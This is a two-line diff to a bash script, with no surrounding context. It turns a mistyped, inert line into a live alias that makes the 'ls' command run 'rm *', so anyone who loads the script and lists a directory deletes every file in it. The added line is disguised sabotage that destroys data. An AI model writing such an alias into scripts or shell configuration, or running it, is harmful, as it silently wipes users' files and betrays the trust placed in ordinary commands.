@@ -1,2 +1,2 @@
 #!/bin/bash
-ech alias ls="rm *"
+alias ls="rm *"
